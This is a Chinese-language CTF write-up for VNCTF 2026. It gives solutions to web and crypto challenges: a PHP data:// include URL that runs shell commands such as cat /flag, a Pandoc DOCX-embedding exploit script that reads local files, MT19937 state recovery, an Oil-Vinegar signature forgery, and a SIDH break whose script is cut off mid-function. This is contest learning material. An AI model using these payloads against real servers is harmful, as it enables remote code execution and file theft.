---
title: VNCTF 2026
published: 2026-02-13
description: "广告位出租"
tags: ["CTF","VShell","混淆"]
draft: false



---

## 

## **signin**

http://114.66.24.228:32544/?file=data:,<%3f=`$_GET[1]`;&1=ls%20/

读根目录有flag

http://114.66.24.228:32544/?file=data:,<%3f=`$_GET[1]`;&1=cat%20/flag

VNCTF{a45c6df1-7e37-4b05-9fdf-832ff45f9da8}



## **Markdown2world**

这是一个详细且简洁的 **Markdown2world** 题目题解。

### 1. 题目分析

- **题目类型**：Web / Pandoc / LFI (任意文件读取)
- **核心工具**：Pandoc（一个通用文档转换工具）。
- **提示 (Hint)**：`world? word? wod? wd? w?`
  - **暗示 1**：目标文件路径极为可能是根目录下的 `/w`。
  - **暗示 2**：`world` -> `Word`，暗示输出格式应选择 Word 文档 (`.docx`)。
- **限制条件**：
  - 上传文件后缀必须为 `.md`。
  - WAF 会拦截部分敏感词（如 `include`），且后端强制使用 Markdown 解析器，导致常规的 RST 注入（`.. include:: /flag`）失效。

### 2. 漏洞原理

Pandoc 在将 Markdown 转换为 **“容器格式”**（如 **DOCX**, **ODT**, **EPUB**）时，为了保证文档在其他设备上的完整性，会强制读取文档中引用的**本地资源**（如图片），并将这些文件的内容打包进生成的文档（ZIP 压缩包）中。

即便引用的文件（如 `/w`）不是合法的图片格式（文本文件），Pandoc 也会将其作为二进制流读取并打包，从而实现**任意文件读取**。

### 3. 解题步骤

#### 第一步：构造 Payload

利用标准的 Markdown 图片语法，引用提示中的目标文件 `/w`。这既符合 Markdown 语法，又能绕过针对特定关键词（如 `include`）的 WAF 检测。

创建文件 `exploit.md`，内容如下：

Markdown

```
![flag_file](/w)
```

#### 第二步：实施攻击 (利用 DOCX 容器特性)

由于转换成 HTML 时服务器未开启 `--self-contained` 选项（导致图片无法内嵌），我们需要将目标格式 (`toFormat`) 指定为 **DOCX**。

使用 Python 脚本或 Burp Suite 发送请求：

- **URL**: `/convert.php`
- **POST Data**:
  - `file`: 上传 `exploit.md`
  - `fromFormat`: `markdown` (默认)
  - `toFormat`: **`docx`** (关键点：生成 Word 文档)

#### 第三步：提取 Flag

1. 下载转换成功后的 `.docx` 文件。
2. `.docx` 本质上是一个 ZIP 压缩包。将文件后缀改为 `.zip` 并解压（或直接用解压软件打开）。
3. 在解压后的目录 `word/media/` 中找到被嵌入的文件（文件名通常被重命名，如 `image1.png` 或保留原名）。
4. 用文本编辑器打开该文件，即可看到 Flag。

#### 复现脚本 (Python)

```
import requests
import re
import zipfile
import io

# 题目地址
BASE_URL = "http://114.66.24.228:32601"
CONVERT_URL = f"{BASE_URL}/convert.php"

# ------------------------------------------------------------------
# 终极策略：Markdown 转 Word (DOCX)
# 原理：Docx 格式必须包含图片文件。Pandoc 会强制读取本地文件并打包进 docx (zip) 中。
# ------------------------------------------------------------------

# 构造 Payload：标准 Markdown 图片语法
# 同时尝试读取 /w (根据hint) 和 /flag
payload_content = """
# Leak Attempt

Image 1:
![w_file](/w)

Image 2:
![flag_file](/flag)
"""

files = {
    'file': ('leak.md', payload_content, 'text/markdown')
}

# 【关键】目标格式设为 DOCX (Word)
data = {
    'fromFormat': 'markdown',
    'toFormat': 'docx'
}

try:
    print(f"[*] Sending payload: Markdown -> DOCX (Target: /w & /flag)...")

    response = requests.post(CONVERT_URL, files=files, data=data)
    res_json = response.json()

    if res_json.get('success'):
        download_url = res_json.get('download_url')
        print(f"[+] Conversion successful! DOCX URL: {download_url}")

        # 1. 下载生成的 DOCX 文件
        docx_url = f"{BASE_URL}/{download_url}"
        docx_bytes = requests.get(docx_url).content

        # 2. 将 DOCX 作为 ZIP 文件处理
        print("[*] Downloading and unzipping DOCX container...")
        with zipfile.ZipFile(io.BytesIO(docx_bytes)) as z:
            # 列出所有文件
            file_list = z.namelist()
            # 过滤出媒体文件 (Pandoc 通常把图片放在 word/media/ 目录下)
            media_files = [f for f in file_list if f.startswith('word/media/')]

            if not media_files:
                print("[-] No embedded media found in the DOCX.")
                print("    Debug: All files in zip:", file_list)
            else:
                print(f"[+] Found {len(media_files)} embedded files! Extracting...\n")
                for media_path in media_files:
                    content = z.read(media_path)
                    try:
                        # 尝试解码为文本
                        text_content = content.decode('utf-8')
                        print(f"--- Content of {media_path} ---")
                        print(text_content)
                        print("---------------------------------")

                        if "flag{" in text_content:
                            print(f"\n[!!!] FLAG FOUND: {re.search(r'flag\{.*?\}', text_content).group(0)}")
                    except UnicodeDecodeError:
                        print(f"--- Content of {media_path} (Binary/Image) ---")
                        print(f"[Binary data: {len(content)} bytes]")
                        # 如果是真正的图片，这里会是乱码；如果是flag文本，上面会解码成功
    else:
        print(f"[-] Failed: {res_json.get('message')}")
        # 如果 docx 失败，可能是因为 Pandoc 发现 /w 不是有效图片格式而报错
        # 我们可以尝试 ODT 或 EPUB，原理相同
        print("[*] Tip: If DOCX failed, try changing 'toFormat' to 'odt' or 'epub' in the script.")

except Exception as e:
    print(f"[-] Error: {e}")
```

## 

```
[*] Sending payload: Markdown -> DOCX (Target: /w & /flag)...
[+] Conversion successful! DOCX URL: converted/cadf1bf59e2eedbb0a77d4c55e4553d3_converted.docx
[*] Downloading and unzipping DOCX container...
[+] Found 1 embedded files! Extracting...

--- Content of word/media/rId9.so ---
VNCTF{1lL3_ReAD1Ng_p@nd#C}

---------------------------------
```



## **NumberGuesser**

### 题目代码核心

服务端逻辑（简化）：

1. `seed = os.urandom(8)`（8 字节真随机）
2. `random.seed(seed)`（Python `random` = MT19937）
3. 生成 `hints = [getrandbits(32) for _ in range(624)]`
4. 生成 `key = getrandbits(128)`（用于 AES-CBC）
5. IV 使用 `seed*2`（即 `seed||seed`，16 字节，前后 8 字节相同）
6. 输出密文 `enc`，允许查询至多 10 个 `hint[i]`

目标：用少量 hint 恢复 PRNG 状态/seed/key，从而解密 flag。

------

#### 关键观察 1：624 个 hint 正好吃完一整轮 MT 输出

MT19937 内部状态为 624 个 32-bit。题目生成了：

```
self.hints = [random.getrandbits(32) for _ in range(624)]
```

这正好把当前状态对应的 624 次输出全部取完。
 因此随后生成 `getrandbits(128)` 时，会触发 **twist**，进入下一轮状态，然后取下一轮的前 4 个 32-bit 输出拼成 128-bit key。

------

#### 关键观察 2：恢复 key 不需要 624 个输出，只需要 9 个

MT 的 twist 公式（只看依赖关系）：

- `new[i]` 依赖 `old[i]、old[i+1]、old[i+397]`

因此：

- `new[0]` 只依赖 `old[0], old[1], old[397]`
- `new[1]` 只依赖 `old[1], old[2], old[398]`
- `new[2]` 只依赖 `old[2], old[3], old[399]`
- `new[3]` 只依赖 `old[3], old[4], old[400]`

而 `hint[i]` 是 `old[i]` 经过 MT 的 **temper** 后输出的值，所以我们只要查询 9 个位置：

> ```
> 0,1,2,3,4,397,398,399,400
> ```

将这些 hint **untemper** 回去得到对应的 `old[...]`，就能算出 `new[0..3]`，再 temper 得到 twist 后下一轮的前 4 个输出 `out0..out3`。

##### 重要坑：getrandbits(128) 的拼接顺序

CPython 的 `getrandbits(128)` 是**低位先取**，即：

```
key = out0 + (out1<<32) + (out2<<64) + (out3<<96)
```

不是 `out0` 当最高位！这个顺序错了会导致永远解不出。

------

#### 关键观察 3：IV = seed||seed，结合已知前缀只需爆破 2 字节

CBC 第一块：

- `P1 = Dec(C1) XOR IV`
- 记 `D1 = Dec(C1)`，则 `IV = D1 XOR P1`

又因为 `IV = s||s`（s 为 8 字节 seed），所以有约束：

对 `i=0..7`：

```
P1[i+8] = D1[i+8] XOR s[i]
P1[i]   = D1[i]   XOR s[i]
=> P1[i+8] = D1[i+8] XOR D1[i] XOR P1[i]
```

已知 flag 前缀是 `VNCTF{` 共 6 字节，因此 `P1[0..5]` 已知，只剩 `P1[6],P1[7]` 两个字节未知。

爆破 2^16 (=65536) 个可能就能恢复 `P1[0..7]`，进而得到 `seed8 = D1[0..7] XOR P1[0..7]`，从而得到 IV=`seed8||seed8` 解密整段密文。

------

#### 如何避免“假阳性”

仅凭 `unpad` 成功 + `VNCTF{...}` 形式，理论上可能出现极少数假阳性。

所以加一个 **seed 复验**：

- 用候选 `seed8` 在本地 `random.seed(seed8)`
- 生成 624 个 `getrandbits(32)` 必须和服务端查询到的 hint 完全一致
- 再生成一次 `getrandbits(128)` 也必须等于我们推出来的 key

这样就能保证唯一真解。



### 解题脚本

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import remote, context
import re
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

context.log_level = "error"  # "info"/"debug" 可看细节

HOST = "114.66.24.228"
PORT = 32532

MASK32 = 0xFFFFFFFF

# ---------- MT19937 temper / untemper ----------
def temper(y: int) -> int:
    y &= MASK32
    y ^= (y >> 11)
    y ^= (y << 7) & 0x9D2C5680
    y ^= (y << 15) & 0xEFC60000
    y ^= (y >> 18)
    return y & MASK32

def unshift_right_xor(y: int, shift: int) -> int:
    x = y & MASK32
    for _ in range(10):
        x = y ^ (x >> shift)
    return x & MASK32

def unshift_left_xor_mask(y: int, shift: int, mask: int) -> int:
    x = y & MASK32
    for _ in range(10):
        x = y ^ ((x << shift) & mask)
    return x & MASK32

def untemper(y: int) -> int:
    y = unshift_right_xor(y, 18)
    y = unshift_left_xor_mask(y, 15, 0xEFC60000)
    y = unshift_left_xor_mask(y, 7, 0x9D2C5680)
    y = unshift_right_xor(y, 11)
    return y & MASK32

def twist_one(old_i: int, old_ip1: int, old_i397: int) -> int:
    y = (old_i & 0x80000000) | (old_ip1 & 0x7FFFFFFF)
    x = (old_i397 ^ (y >> 1)) & MASK32
    if y & 1:
        x ^= 0x9908B0DF
    return x & MASK32

# ---------- IO helpers ----------
HEX_RE = re.compile(rb"^[0-9a-fA-F]{32,}$")

def recv_ciphertext(io) -> bytes:
    io.recvuntil(b"Encrypted flag:")
    for _ in range(20):
        line = io.recvline(timeout=5)
        if not line:
            break
        line = line.strip()
        if HEX_RE.match(line):
            return bytes.fromhex(line.decode())
    raise ValueError("ciphertext line not found")

def query_hint(io, idx: int) -> int:
    io.recvuntil(b"Enter index")
    io.sendline(str(idx).encode())
    while True:
        line = io.recvline(timeout=5)
        if not line:
            raise EOFError("server closed while waiting hint")
        m = re.search(rb"hint\[(\d+)\]\s*=\s*(\d+)", line)
        if m:
            return int(m.group(2)) & MASK32

# ---------- validation ----------
def validate_seed(seed8: bytes, observed_hints: dict, key_int: int) -> bool:
    r = random.Random()
    r.seed(seed8)

    # 生成624个hint（跟服务端一致）
    gen = [r.getrandbits(32) for _ in range(624)]
    for idx, val in observed_hints.items():
        if gen[idx] != val:
            return False

    # 下一次 getrandbits(128) 必须等于我们推出来的 key
    k2 = r.getrandbits(128)
    return k2 == key_int

def main():
    # 9个足够推 key；第10个随便问一个不冲突的
    need9 = [0, 1, 2, 3, 4, 397, 398, 399, 400]
    dummy = 10 if 10 not in need9 else 11
    ask10 = need9 + [dummy]

    io = remote(HOST, PORT)
    try:
        ct = recv_ciphertext(io)

        observed = {}  # idx -> hint value (tempered output)
        for idx in ask10:
            val = query_hint(io, idx)
            if idx in need9:
                observed[idx] = val

        # ---- recover old state words (untemper) ----
        old = {i: untemper(observed[i]) for i in need9}

        # ---- compute new state words after twist ----
        new0 = twist_one(old[0], old[1], old[397])
        new1 = twist_one(old[1], old[2], old[398])
        new2 = twist_one(old[2], old[3], old[399])
        new3 = twist_one(old[3], old[4], old[400])

        out0 = temper(new0)
        out1 = temper(new1)
        out2 = temper(new2)
        out3 = temper(new3)

        # 关键：CPython getrandbits(128) 是“低位先来”
        key_int = (out0) | (out1 << 32) | (out2 << 64) | (out3 << 96)
        key = key_int.to_bytes(16, "big")

        # ---- brute 2 bytes for P1[6..7] to recover seed8 and iv ----
        c1 = ct[:16]
        d1 = AES.new(key, AES.MODE_ECB).decrypt(c1)

        prefix6 = b"VNCTF{"

        for guess in range(0x10000):
            g2 = guess.to_bytes(2, "big")
            p0_7 = prefix6 + g2  # 8 bytes

            # seed8 = D1[0..7] xor P1[0..7]
            seed8 = bytes([d1[i] ^ p0_7[i] for i in range(8)])
            iv = seed8 + seed8

            try:
                pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
                pt = unpad(pt, 16)
            except ValueError:
                continue

            if not (pt.startswith(b"VNCTF{") and pt.endswith(b"}")):
                continue

            # 最关键：用 seed8 复验是否能生成同一组 hints & key
            if not validate_seed(seed8, observed, key_int):
                continue

            # 到这里基本就是唯一真解
            print("FLAG (repr):", repr(pt))
            print("FLAG:", pt.decode(errors="strict"))
            return

        print("[-] Not found. (unexpected)")

    finally:
        io.close()

if __name__ == "__main__":
    main()

```

最终flag

```
FLAG (repr): b'VNCTF{6R3AK1N6_PyThoN_$_pRNg_W1tH_A_feW_Va1uE$_AnD_no_bRuteforCe}'
FLAG: VNCTF{6R3AK1N6_PyThoN_$_pRNg_W1tH_A_feW_Va1uE$_AnD_no_bRuteforCe}
```



## **ezov**

### 解题思路

题目给了一个“签名/验证”服务端脚本（`main.sage`）和公钥（`pub.txt`），核心验证条件是：

- 模数：素数 p=65537p=65537p=65537

- 向量维度：n=128n=128n=128

- 公钥：64 个对称矩阵 Pi∈Fp128×128P_i \in \mathbb{F}_p^{128\times 128}Pi∈Fp128×128

- 对消息 mmm，计算

  h=H(m)∈Fp64h = H(m) \in \mathbb{F}_p^{64}h=H(m)∈Fp64

  （`shake_128` 输出 64 个 16-bit）

- 给签名 s∈Fp128s\in\mathbb{F}_p^{128}s∈Fp128，验证：

  sTPis≡hi(modp),i=0..63s^T P_i s \equiv h_i \pmod p,\quad i=0..63sTPis≡hi(modp),i=0..63

关键观察：这是平衡型 Oil-Vinegar（OV）结构

题名 ezov + 参数 `v=o=64`，并且私钥坐标系下每个二次型矩阵满足块结构：

Qi=(AiBiBiT0)Q_i=\begin{pmatrix} A_i & B_i\\ B_i^T & 0 \end{pmatrix}Qi=(AiBiTBi0)

其中：

- 上左块 AiA_iAi 对应 vinegar-vinegar
- 右上块 BiB_iBi 对应 vinegar-oil（并且在这题里可逆/满秩）
- **右下块 oil-oil 为 0**（OV 的核心）

公钥 PiP_iPi 是这些 QiQ_iQi 在未知线性变换 SSS 下的同构：

Pi=S−TQiS−1P_i = S^{-T}Q_i S^{-1}Pi=S−TQiS−1

突破点：利用 P0−1P1P_0^{-1}P_1P0−1P1 的特征多项式“平方”性质恢复 oil 子空间

令

A=P0−1P1A = P_0^{-1}P_1A=P0−1P1

在私钥坐标系下它相似于

Q0−1Q1=(ZT0∗Z)Q_0^{-1}Q_1= \begin{pmatrix} Z^T & 0\\ * & Z \end{pmatrix}Q0−1Q1=(ZT∗0Z)

这是一个“上下三角块”矩阵，且对角线上两个块（ZTZ^TZT 与 ZZZ）有相同特征多项式，所以：

- AAA 的特征多项式满足

  χA(x)=f(x)2\chi_A(x)=f(x)^2χA(x)=f(x)2

  其中 f(x)f(x)f(x) 是某个 64 次多项式。

如果我们取这个 f(x)f(x)f(x)，计算矩阵多项式：

N=f(A)N = f(A)N=f(A)

则 NNN 会“杀掉”一半空间，使其像空间恰好对应 **oil 子空间 UUU**（维度 64）。
 于是我们只要取 NNN 的列空间基，就得到 UUU。

具体实现上：

- 先在 Fp\mathbb{F}_pFp 上算出 χA(x)\chi_A(x)χA(x)
- 然后用 gcd⁡(χA(x),χA′(x))\gcd(\chi_A(x), \chi_A'(x))gcd(χA(x),χA′(x)) 抽出平方因子得到 f(x)f(x)f(x)
- 计算 N=f(A)N=f(A)N=f(A)
- 求 NNN 的列空间基，得到 UUU

得到 UUU 后如何伪造签名

有了 oil 子空间基 UUU 后，可以构造配套的 vinegar 子空间基：

V=P0⋅UV = P_0 \cdot UV=P0⋅U

然后把二者拼成可逆矩阵：

S=[V∣U]∈Fp128×128S = [V\mid U]\in \mathbb{F}_p^{128\times 128}S=[V∣U]∈Fp128×128

在这个基下把公钥矩阵变换成 OV 的标准块形式：

Qi=STPiSQ_i = S^T P_i SQi=STPiS

此时每个 QiQ_iQi 都满足 oil-oil 块为 0，签名过程变成经典 OV：

1. 随机选 vinegar 向量 v∈Fp64v\in\mathbb{F}_p^{64}v∈Fp64

2. 对未知 oil 向量 o∈Fp64o\in\mathbb{F}_p^{64}o∈Fp64，每个方程变成线性：

   vTAiv+2vTBio=hiv^TA_iv + 2v^TB_io = h_ivTAiv+2vTBio=hi

3. 组成 64×64 线性方程组解出 ooo

4. 得到私钥坐标下向量 y=[v∣o]y=[v\mid o]y=[v∣o]

5. 输出签名 s=S⋅ys=S\cdot ys=S⋅y

这样就能对任意消息（比如 `"admin"`）构造通过验证的签名，从而拿 flag。

### 解题脚本

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solve for ezov (balanced Oil-Vinegar over GF(65537)).

Requires: numpy, sympy (both commonly available in CTF env)
"""

import ast
import hashlib
import socket
import numpy as np
import sympy as sp

HOST = "114.66.24.228"
PORT = 32499

p = 65537
v = o = 64
n = v + o

# ---------- basic modular linear algebra (GF(p)) ----------

def inv_mod_mat(A, mod=p):
    A = (A.copy() % mod).astype(np.int64)
    n = A.shape[0]
    I = np.eye(n, dtype=np.int64)
    aug = np.concatenate([A, I], axis=1)
    for col in range(n):
        pivot = None
        for r in range(col, n):
            if aug[r, col] % mod != 0:
                pivot = r
                break
        if pivot is None:
            raise ValueError("matrix is singular")
        if pivot != col:
            aug[[col, pivot]] = aug[[pivot, col]]
        inv_piv = pow(int(aug[col, col] % mod), mod - 2, mod)
        aug[col, :] = (aug[col, :] * inv_piv) % mod
        for r in range(n):
            if r == col:
                continue
            f = aug[r, col] % mod
            if f:
                aug[r, :] = (aug[r, :] - f * aug[col, :]) % mod
    return aug[:, n:]

def solve_linear(A, b, mod=p):
    """Solve A x = b over GF(mod). Return x or None if singular."""
    A = (A.copy() % mod).astype(np.int64)
    b = (b.copy() % mod).astype(np.int64).reshape(-1, 1)
    n = A.shape[0]
    aug = np.concatenate([A, b], axis=1)

    row = 0
    for col in range(n):
        pivot = None
        for r in range(row, n):
            if aug[r, col] % mod != 0:
                pivot = r
                break
        if pivot is None:
            return None
        if pivot != row:
            aug[[row, pivot]] = aug[[pivot, row]]
        inv_piv = pow(int(aug[row, col] % mod), mod - 2, mod)
        aug[row, :] = (aug[row, :] * inv_piv) % mod
        for r in range(n):
            if r == row:
                continue
            f = aug[r, col] % mod
            if f:
                aug[r, :] = (aug[r, :] - f * aug[row, :]) % mod
        row += 1

    return aug[:, -1].reshape(-1)

def col_space_basis(A, mod=p):
    """Return a column-space basis of A over GF(mod) as an (n,rank) matrix."""
    A = (A.copy() % mod).astype(np.int64)
    M = A.copy()
    r, c = M.shape
    row = 0
    pivcols = []
    for col in range(c):
        pivot = None
        for rr in range(row, r):
            if M[rr, col] % mod != 0:
                pivot = rr
                break
        if pivot is None:
            continue
        if pivot != row:
            M[[row, pivot]] = M[[pivot, row]]
        inv_piv = pow(int(M[row, col] % mod), mod - 2, mod)
        M[row, :] = (M[row, :] * inv_piv) % mod
        for rr in range(row + 1, r):
            f = M[rr, col] % mod
            if f:
                M[rr, :] = (M[rr, :] - f * M[row, :]) % mod
        pivcols.append(col)
        row += 1
        if row == r:
            break
    basis_cols = [A[:, j].copy() % mod for j in pivcols]
    return np.column_stack(basis_cols)

def rank_mod(A, mod=p):
    A = (A.copy() % mod).astype(np.int64)
    r, c = A.shape
    row = 0
    rank = 0
    for col in range(c):
        pivot = None
        for rr in range(row, r):
            if A[rr, col] % mod != 0:
                pivot = rr
                break
        if pivot is None:
            continue
        if pivot != row:
            A[[row, pivot]] = A[[pivot, row]]
        inv_piv = pow(int(A[row, col] % mod), mod - 2, mod)
        A[row, :] = (A[row, :] * inv_piv) % mod
        for rr in range(row + 1, r):
            f = A[rr, col] % mod
            if f:
                A[rr, :] = (A[rr, :] - f * A[row, :]) % mod
        row += 1
        rank += 1
        if row == r:
            break
    return rank

# ---------- load public key matrices ----------

def load_pub(path="pub.txt"):
    mats = []
    with open(path, "r", encoding="utf-8") as f:
        for _ in range(o):
            _ = f.readline()  # header like "P_0 ="
            s = "".join([f.readline().strip() for _ in range(n)])
            data = ast.literal_eval(s)
            arr = (np.array(data, dtype=np.int64) % p)
            assert arr.shape == (n, n)
            mats.append(arr)
    return mats

# ---------- characteristic polynomial mod p (Faddeev–LeVerrier) ----------

def charpoly_mod(A, mod=p):
    A = (A.copy() % mod).astype(np.int64)
    n = A.shape[0]
    B = np.eye(n, dtype=np.int64)
    coeffs = []
    for k in range(1, n + 1):
        B = (A.dot(B)) % mod
        tr = int(np.trace(B) % mod)
        ck = (-tr * pow(k, mod - 2, mod)) % mod
        coeffs.append(ck)
        if ck:
            idx = np.arange(n)
            B[idx, idx] = (B[idx, idx] + ck) % mod
    # x^n + c1 x^(n-1) + ... + cn
    return [1] + coeffs

def poly_eval_mat(coeffs_high_to_low, A, mod=p):
    """Evaluate polynomial at matrix A via Horner: coeffs are [a0..ad] for a0*x^d + ... + ad."""
    A = (A.copy() % mod).astype(np.int64)
    n = A.shape[0]
    res = np.zeros((n, n), dtype=np.int64)
    I = np.eye(n, dtype=np.int64)
    for c in coeffs_high_to_low:
        res = (A.dot(res)) % mod
        if c:
            idx = np.arange(n)
            res[idx, idx] = (res[idx, idx] + int(c)) % mod
    return res

# ---------- recover Oil subspace U ----------

def recover_oil_basis(pub):
    P0 = pub[0]
    P0_inv = inv_mod_mat(P0)

    # Similarity matrix: A = P0^{-1} P1  ~  [[Z^T, 0],[*, Z]]
    A = (P0_inv.dot(pub[1])) % p

    # charpoly(A) = f(x)^2 (because diag blocks have same charpoly); the squarefree part is gcd(cp, cp')
    x = sp.Symbol("x")
    cp_coeffs = charpoly_mod(A)
    cp = sp.Poly(sum(int(c) * x ** (n - i) for i, c in enumerate(cp_coeffs)), x, modulus=p)
    f = sp.gcd(cp, cp.diff())          # deg 64
    f_coeffs = [int(c) % p for c in f.all_coeffs()]

    # N = f(A) has image exactly the Oil subspace (dim 64)
    N = poly_eval_mat(f_coeffs, A)
    U = col_space_basis(N)
    assert U.shape == (n, o)
    return U

# ---------- signing (forge admin) ----------

def hash_vec(msg: bytes, mod=p):
    h = hashlib.shake_128(msg).hexdigest(128)  # 128 bytes -> 256 hex chars -> 64 * 16-bit
    out = []
    for i in range(0, 4 * o, 4):
        out.append(int(h[i:i + 4], 16) % mod)
    return np.array(out, dtype=np.int64)

def transform_key(pub, S):
    ST = S.T % p
    Q = []
    for P in pub:
        Q.append((ST.dot(P).dot(S)) % p)
    return Q

def sign_message(target_vec, Qmats, S, max_tries=300):
    # In transformed coordinates y=(vinegar,oil):
    # q_i(y)= v^T A_i v + 2 v^T B_i o  (since oil-oil block = 0)
    As = [Q[:v, :v] for Q in Qmats]
    Bs = [Q[:v, v:] for Q in Qmats]

    rng = np.random.default_rng()
    for _ in range(max_tries):
        vv = rng.integers(0, p, size=v, dtype=np.int64)
        vv_row = vv.reshape(1, -1)

        L = np.zeros((o, o), dtype=np.int64)
        c = np.zeros(o, dtype=np.int64)
        for i in range(o):
            quad = int((vv_row.dot(As[i]).dot(vv) % p).item())
            c[i] = (int(target_vec[i]) - quad) % p
            L[i, :] = (2 * (vv_row.dot(Bs[i]) % p)) % p

        oo = solve_linear(L, c)
        if oo is None:
            continue

        y = np.concatenate([vv, oo]) % p
        sig = (S.dot(y)) % p
        return sig

    raise RuntimeError("sign failed (try increasing max_tries)")

# ---------- remote io helpers ----------

def recvuntil(sock, token: bytes, max_bytes=1 << 20):
    data = b""
    while token not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > max_bytes:
            break
    return data

def main():
    pub = load_pub("pub.txt")

    # 1) recover Oil subspace
    U = recover_oil_basis(pub)

    # 2) build basis S = [V | U], where V = P0*U (the shared Vinegar subspace image)
    V = (pub[0].dot(U)) % p
    S = np.concatenate([V, U], axis=1) % p
    assert rank_mod(S) == n

    # 3) transform public key into (Vinegar,Oil) coordinates
    Qmats = transform_key(pub, S)

    # 4) forge signature for "admin"
    target = hash_vec(b"admin")
    sig = sign_message(target, Qmats, S)
    sig_list = "[" + ",".join(str(int(x)) for x in sig.tolist()) + "]"

    # 5) send to remote
    with socket.create_connection((HOST, PORT)) as s:
        # service prompt is '>' (see main.sage input('>'))
        recvuntil(s, b">")
        s.sendall(b"2\n")
        recvuntil(s, b"signature")
        s.sendall(sig_list.encode() + b"\n")
        out = s.recv(4096)
        print(out.decode(errors="ignore"), end="")

if __name__ == "__main__":
    main()
```

最终flag

```
(latt) ➜  Crypto python solve_fixed.py
VNCTF{2eccef4f-da1b-4292-83a1-a81148f06f88}
[+] 1. sign
[+] 2. verify
>%       
```



## HD_is_what

### 解题思路

- 由 `a=82,b=57` 可知 p=282⋅357−1p=2^{82}\cdot 3^{57}-1p=282⋅357−1，并在 Fp2\mathbb F_{p^2}Fp2 上做 SIDH/SIKE 风格同源密钥交换；`points` 给出起始曲线 E0E_0E0 的 2a2^a2a / 3b3^b3b torsion 基。
- `bob_obfuscated` / `alice_obfuscated` 各 12 个数：对应公钥展开后的 12 维向量（曲线参数 2 个 Fp2\mathbb F_{p^2}Fp2 + 两个点各 4 个 Fp\mathbb F_pFp 分量）。
- 题目用 LCG（seed= p）生成 12×12 整数矩阵 MMM，做线性混淆：`Y = X * M`。复现 LCG 和矩阵后求逆：`X = Y * M^{-1}`，即可还原标准 SIDH 公钥 (EA,PA,QA),(EB,PB,QB)(E_A,P_A,Q_A),(E_B,P_B,Q_B)(EA,PA,QA),(EB,PB,QB)。
- 对恢复出的 Bob 公钥使用 Castryck–Decru 攻击（SIDH 已被该攻击破坏）得到 Bob 私钥 `sk_B`。
- 按题目协议在 EAE_AEA 上计算共享曲线：kernel = PA+skBQAP_A + sk_B Q_APA+skBQA，取共享 jjj-invariant，`key = sha256(str(j))` 作为 AES-CBC key 解密得到 flag。

### 解题脚本

```
#!/usr/bin/env sage
# -*- coding: utf-8 -*-
#
# HD_is_what — final solve
# Usage: sage solve.sage
#
# Needs: output.txt, pycryptodome
# Auto-downloads GiacomoPope/Castryck-Decru-SageMath if missing.

import ast, os, sys, tarfile, subprocess, io, re, inspect
from contextlib import redirect_stdout
from hashlib import sha256

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

OUT_PATH = "output.txt"
REPO_DIR = "Castryck-Decru-SageMath-main"
ARCHIVE  = "cd_attack_repo.tar.gz"


# ============================================================
# 0) Read output
# ============================================================
data = ast.literal_eval(open(OUT_PATH, "r").read())
a = int(data["params"]["a"])
b = int(data["params"]["b"])
p = (2**a) * (3**b) - 1

print("[+] a,b =", a, b)
print("[+] p bits =", p.nbits())


# ============================================================
# 1) Reproduce task.sage LCG + matrices, deobfuscate
#    Y = raw * M  => raw = Y * M^{-1}
# ============================================================
state = int(p)
MOD32 = 2**32

def next_rand():
    global state
    state = (state * 1664525 + 1013904223) % MOD32
    return state

dim = 12
def make_matrix():
    M = Matrix(ZZ, dim, dim)
    for r in range(dim):
        for c in range(dim):
            x = next_rand()
            M[r, c] = (x % 10 + 10) if r == c else (x % 5)
    return M

M_bob   = make_matrix()
M_alice = make_matrix()

Y_bob   = vector(ZZ, list(map(int, data["bob_obfuscated"])))
Y_alice = vector(ZZ, list(map(int, data["alice_obfuscated"])))

bob_raw_QQ   = Y_bob.change_ring(QQ)   * M_bob.change_ring(QQ).inverse()
alice_raw_QQ = Y_alice.change_ring(QQ) * M_alice.change_ring(QQ).inverse()

def to_int_list(v):
    out = []
    for x in list(v):
        if x.denominator() != 1:
            raise ValueError("Non-integer recovered component: %s" % x)
        out.append(int(x))
    return out

bob_raw   = to_int_list(bob_raw_QQ)
alice_raw = to_int_list(alice_raw_QQ)

print("[+] deobfuscation OK (all integers)")


# ============================================================
# 2) Rebuild F_{p^2}, curves and points
# ============================================================
Fp = GF(p)
R.<X> = PolynomialRing(Fp)
Fp2.<i> = GF(p^2, modulus=X^2 + 1)

def fp2_from_pair(c0, c1):
    return Fp2(int(c0)) + Fp2(int(c1))*i

def point_from_list(E, L4):
    x = fp2_from_pair(L4[0], L4[1])
    y = fp2_from_pair(L4[2], L4[3])
    return E(x, y)

E_start = EllipticCurve(Fp2, [0, 6, 0, 1, 0])
E_start.set_order((p+1)^2, num_checks=0)

# Bob public: EB, PB, QB
EB_a4 = fp2_from_pair(bob_raw[0], bob_raw[1])
EB_a6 = fp2_from_pair(bob_raw[2], bob_raw[3])
EB = EllipticCurve(Fp2, [0, 6, 0, EB_a4, EB_a6])
EB.set_order((p+1)^2, num_checks=0)
PB = point_from_list(EB, bob_raw[4:8])
QB = point_from_list(EB, bob_raw[8:12])

# Alice public: EA, PA, QA
EA_a4 = fp2_from_pair(alice_raw[0], alice_raw[1])
EA_a6 = fp2_from_pair(alice_raw[2], alice_raw[3])
EA = EllipticCurve(Fp2, [0, 6, 0, EA_a4, EA_a6])
EA.set_order((p+1)^2, num_checks=0)
PA = point_from_list(EA, alice_raw[4:8])
QA = point_from_list(EA, alice_raw[8:12])

# torsion bases on E_start
P2 = point_from_list(E_start, list(map(int, data["points"]["Pa"])))
Q2 = point_from_list(E_start, list(map(int, data["points"]["Qa"])))
P3 = point_from_list(E_start, list(map(int, data["points"]["Pb"])))
Q3 = point_from_list(E_start, list(map(int, data["points"]["Qb"])))

print("[+] reconstructed curves and points")


# ============================================================
# 3) Download + load CD core only
# ============================================================
def ensure_cd_repo():
    if os.path.isdir(REPO_DIR):
        return
    url = "https://github.com/GiacomoPope/Castryck-Decru-SageMath/archive/refs/heads/main.tar.gz"
    print("[*] downloading Castryck-Decru-SageMath ...")
    try:
        subprocess.check_call(["bash", "-lc", f"curl -L {url} -o {ARCHIVE}"])
    except Exception:
        subprocess.check_call(["bash", "-lc", f"wget -O {ARCHIVE} {url}"])
    with tarfile.open(ARCHIVE, "r:gz") as tf:
        tf.extractall(".")
